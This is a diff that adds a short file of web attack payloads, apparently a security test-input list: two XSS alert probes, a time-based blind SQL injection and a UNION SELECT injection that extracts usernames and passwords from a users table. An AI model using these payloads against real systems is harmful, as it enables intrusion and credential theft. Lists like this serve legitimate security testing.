@@ -1,0 +1,12 @@
+<script>alert('XSS')</script>
+
+
+<img src="x" onerror="alert('XSS')">
+
+
+1' AND benchmark(5000000, MD5(1)) AND '1'='1
+
+
+' UNION SELECT null, username, password FROM users --
+
+
